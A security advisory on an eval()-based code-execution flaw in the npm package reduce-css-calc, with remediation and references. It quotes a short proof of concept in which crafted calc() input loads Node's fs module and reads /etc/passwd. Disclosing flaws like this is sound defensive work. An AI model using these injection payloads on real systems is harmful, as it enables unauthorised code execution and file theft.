## Overview
`reduce-css-calc` is a package that reduces CSS calc() function to the maximum. Affected versions of the package used `evail()` for evaluation the expression, allowing the attacker to gain arbitrary code execution via specially crafted input.

## Example
The [issue](https://gist.github.com/ChALkeR/415a41b561ebea9b341efbb40b802fc9) was reported by [ChALkeR] (https://github.com/ChALkeR) and demonstrated by his [example](https://gist.github.com/ChALkeR/415a41b561ebea9b341efbb40b802fc9) below:

```
const reduceCSSCalc = require('reduce-css-calc');
console.log(reduceCSSCalc(`calc(                       (Buffer(10000)))`));
console.log(reduceCSSCalc(`calc(                       (global['fs'] = require('fs')))`));
console.log(reduceCSSCalc(`calc(                       (fs['readFileSync']("/etc/passwd", "utf-8")))`));
```

## Remediation
Upgrade `reduce-css-calc` version 1.2.5 or greater.

## References
- https://gist.github.com/ChALkeR/415a41b561ebea9b341efbb40b802fc9
- https://github.com/MoOx/reduce-css-calc/blob/master/CHANGELOG.md#125---2016-08-22
